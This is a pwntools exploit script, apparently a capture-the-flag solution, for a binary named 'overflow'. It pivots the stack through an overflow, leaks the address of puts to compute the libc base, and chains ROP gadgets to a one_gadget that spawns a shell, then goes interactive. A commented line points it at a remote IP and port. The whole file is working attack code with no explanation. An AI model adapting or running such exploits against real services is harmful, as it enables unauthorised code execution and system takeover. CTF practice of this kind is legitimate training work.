from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')

sl=lambda x:io.sendline(x)
sd=lambda x:io.send(x)
sa=lambda x,y:io.sendafter(x,y)
sla=lambda x,y:io.sendlineafter(x,y)
rc=lambda x:io.recv(x)
rl=lambda :io.recvline()
ru=lambda x:io.recvuntil(x)
ita=lambda :io.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(io)==pwnlib.tubes.remote.remote:
		return
	elif type(io)==pwnlib.tubes.process.process:
		gdb.attach(io,x)
		pause()

io = process('./overflow')
elf = ELF('./overflow')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
# io = remote("180.76.166.28",40001)

fak_sta=0x6010a0
read_2=0x400700
pop_rdi=0x4007a3
lve_ret=0x400718
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
pay1=b'/bin/sh\x00'
pay1+=b'a'*(0x100-len(pay1))
pay1+=flat([fak_sta+0x120,pop_rdi,puts_got,puts_plt,0x0000000004006C7])

sa('name',pay1)
# pause()

pay2=flat([b'a'*0x70,fak_sta+0x100,lve_ret])
sa('data',pay2)
# pause()

puts_add=uu64(ru(b'\x7f')[-6:])
print(hex(puts_add))
print('puts',hex(libc.sym['puts']))

libc_base=puts_add-libc.sym['puts']
sys_add=libc_base+libc.sym['system']
sh_add=libc_base+libc.search(b'/bin/sh').__next__()
pop_rdx=libc_base+0x0000000000142c92

# ita()
# pay1=b'/bin/sh\x00'
# pay1=flat([b'a'*0x50,fak_sta+0x70,pop_rdi,puts_got,puts_plt,0x0000000004006C7])
one_ga=0xe3b01
# gdba()

# pay1=b's'
pay1=b'/bin/sh\x00'
pay1+=b's'*(168-len(pay1))+p64(0x4006f2)
pay1+=b'a'*(0x120-len(pay1))+p64(fak_sta+0x30)
pay1+=p64(pop_rdx)+p64(0)+p64(one_ga+libc_base)
# pay1+=b'a'*(0x10-len(pay1))
# pay1+=flat([fak_sta+0x30,pop_rdi,puts_got,puts_plt,puts_plt])
sa('name',pay1)

# gdba()
# gdba()
# 
# print('libc_base',hex(libc_base))
# pay2=flat([b'a'*0x70,fak_sta+0x50,lve_ret])
# sa('data',pay2)
# puts_add=uu64(ru(b'\x7f')[-6:])
# print(hex(puts_add))
# print('puts',hex(libc.sym['puts']))
# gdba()

# libc_base=puts_add-libc.sym['puts']
# sys_add=libc_base+libc.sym['system']
# sh_add=libc_base+libc.search(b'/bin/sh').__next__()

# one_ga=0xf1247
# print(libc_base,libc_base+one_ga)
# pay3=flat([b'a'*0x78,one_ga+libc_base])
print('name',hex(fak_sta))
pay3=flat([b'a'*0x70])
sd(pay3)

ita()